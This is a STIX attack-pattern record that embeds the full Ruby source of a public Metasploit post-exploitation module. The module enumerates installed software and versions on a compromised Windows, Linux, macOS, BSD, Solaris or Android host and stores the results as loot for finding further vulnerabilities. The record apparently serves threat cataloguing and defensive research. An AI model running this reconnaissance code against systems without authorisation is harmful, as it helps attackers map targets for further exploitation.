{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a88ebcf5-6994-459f-a48c-bbd59146ee6c",
    "created": "2024-08-14T16:33:19.160105Z",
    "modified": "2024-08-14T16:33:19.160109Z",
    "name": "Multiplatform Installed Software Version Enumerator",
    "description": " This module, when run against a compromised machine, will gather details on all installed software including their versions and if available, when they were installed, and will save it into a loot file for later use. Users can then use this loot file to determine what additional vulnerabilites may affect the target machine.  Note that for Linux systems, software enumeration is done via package managers. As a result the results may not reflect all of the available software on the system simply because users may have installed additional software from alternative sources such as source code that these package managers are not aware of.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/multi/gather/enum_software_versions.rb",
            "external_id": "enum_software_versions.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Post\n  include Msf::Post::Android::Priv\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Multiplatform Installed Software Version Enumerator',\n        'Description' => %q{\n          This module, when run against a compromised machine, will gather details on all installed software,\n          including their versions and if available, when they were installed, and will save it into a loot file for later use.\n          Users can then use this loot file to determine what additional vulnerabilites may affect the target machine.\n\n          Note that for Linux systems, software enumeration is done via package managers. As a result the results may\n          not reflect all of the available software on the system simply because users may have installed additional\n          software from alternative sources such as source code that these package managers are not aware of.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [ 'gwillcox-r7' ],\n        'Platform' => %w[win linux osx bsd solaris android],\n        'SessionTypes' => [ 'meterpreter', 'shell' ],\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n  end\n\n  def store_linux_loot(listing)\n    file = store_loot('host.linux.software.versions', 'text/plain', session, listing, 'installed_software.txt', 'Installed Software and Versions')\n    print_good(\"Stored information about the installed products to the loot file at #{file}\")\n  end\n\n  def enumerate_android_packages\n    if command_exists?('pm') == false\n      print_error(\"The command 'pm' does not exist on the host\")\n      return nil\n    end\n    listing = cmd_exec('pm list packages -f').to_s\n    if listing.empty?\n      print_error('No results were returned when trying to get software installed on the Linux host. An error likely occured.')\n      return nil\n    end\n    listing\n  end\n\n  # Run Method for when run command is issued\n  def run\n    case session.platform\n    when 'windows'\n      if command_exists?('wmic') == false\n        print_error(\"The 'wmic' command doesn't exist on this host!\") # wmic is technically marked as depreciated so this command could very well be removed in future releases.\n        return\n      end\n      listing = cmd_exec('wmic product get Name, Description, Version, InstallDate', nil, 6000).to_s\n      unless listing.include?('Description')\n        print_error('Was unable to get a listing of installed products...')\n        return\n      end\n      file = store_loot('host.windows.software.versions', 'text/plain', session, listing, 'installed_software.txt', 'Installed Software and Versions')\n      print_good(\"Stored information about the installed products to the loot file at #{file}\")\n    when 'linux'\n      # All of the following options were taken from https://distrowatch.com/dwres.php?resource=package-management\n      # and further verified against VMs that were set up in testing labs.\n      if command_exists?('apt') # Debian, Ubuntu, and Debian derived distros.\n        cmd = %w[apt list --installed]\n      elsif command_exists?('dpkg') # Alternative for Debian based systems\n        cmd = %w[dpkg -l]\n      elsif command_exists?('pacman') # Arch and Manjaro are two popular examples\n        cmd = %w[pacman -Q]\n      elsif command_exists?('zypper') # OpenSUSE is a popular example\n        cmd = %w[zypper search -is]\n      elsif command_exists?('rpm') # Fedora, Centos, RHEL\n        cmd = %w[rpm -qa]\n      elsif command_exists?('apk') # Apline\n        cmd = %w[apk info -v]\n      elsif command_exists?('qlist') # Gentoo\n        cmd = %w[qlist -Iv]\n      elsif command_exists?('pkg') # FreeBSD\n        cmd = %w[pkg info]\n      elsif command_exists?('equo') # Sabayon\n        cmd = %w[equo q list installed -v]\n      elsif command_exists?('nix-env')\n        cmd = %w[nix-env -q]\n      else\n        print_error(\"The target system either doesn't have a package manager system, or does not use a known package manager system!\")\n        print_error('Unable to enumerate the software on the target system. Exiting...')\n        return nil\n      end\n\n      if command_exists?((cmd[0]).to_s) == false\n        print_error(\"The command #{cmd[0]} was not found on the target.\")\n        return\n      else\n        listing = cmd_exec(cmd.join(' ')).to_s\n        if listing.empty?\n          print_error('No results were returned when trying to get software installed on the Linux host. An error likely occured.')\n          return\n        end\n        store_linux_loot(listing)\n      end\n    when 'bsd', 'solaris'\n      if command_exists?('pkg') == false\n        print_error(\"The command 'pkg' does not exist on the host\")\n        return\n      end\n      listing = cmd_exec('pkg info').to_s\n      if listing.empty?\n        print_error('No results were returned when trying to get software installed on the BSD/Solaris host. An error likely occured.')\n        return\n      end\n      file = store_loot('host.bsd.solaris.software.versions', 'text/plain', session, listing, 'installed_software.txt', 'Installed Software and Versions')\n      print_good(\"Stored information about the installed products to the loot file at #{file}\")\n    when 'osx'\n      listing = ''\n      if command_exists?('system_profiler') == false\n        print_error(\"The command 'system_profiler' does not exist on the host! Something is seriously wrong!\")\n        return\n      end\n      command_result = cmd_exec('system_profiler SPApplicationsDataType').to_s\n      if command_result.empty?\n        print_error('No results were returned when trying to get software installed on the OSX host via system_profiler!')\n        return\n      end\n      listing += command_result\n\n      # Start enumerating other potential MacOS package managers now that\n      # the main system app manager has been enumerated.\n      if command_exists?('brew') # HomeBrew\n        listing += \"\\n\\n----------------Brew Packages----------------\\n\"\n        listing += cmd_exec('brew list --versions')\n      end\n\n      if command_exists?('port') # MacPorts\n        listing += \"\\n\\n----------------MacPorts Packages----------------\\n\"\n        listing += cmd_exec('port installed')\n      end\n\n      file = store_loot('host.osx.software.versions', 'text/plain', session, listing, 'installed_software.txt', 'Installed Software and Versions')\n      print_good(\"Stored information about the installed products to the loot file at #{file}\")\n    when 'android'\n      if is_root?\n        if command_exists?('dumpsys') == false\n          print_error(\"Something is odd with this Android device. You are root but the dumpsys command doesn't exist. Perhaps the device is too old?\")\n          return\n        end\n        listing = cmd_exec('dumpsys package packages').to_s\n        if listing.empty?\n          print_error('Something went wrong with the command and no output was returned!')\n          return\n        elsif listing =~ /android.permission.DUMP/\n          print_warning('You do not have the permissions needed to dump the versions of software installed. Reverting to just enumerating what software is installed.')\n          listing = enumerate_android_packages\n          return if listing.nil?\n        end\n      else\n        print_warning('You do not have the permissions needed to dump the versions of software installed. Reverting to just enumerating what software is installed.')\n        listing = enumerate_android_packages\n        return if listing.nil?\n      end\n      file = store_loot('host.android.software.versions', 'text/plain', session, listing, 'installed_software.txt', 'Installed Software and Versions')\n      print_good(\"Stored information about the installed products to the loot file at #{file}\")\n    end\n  end\nend\n",
    "x_mitre_platforms": [
        "%w[win linux osx bsd solaris android]"
    ]
}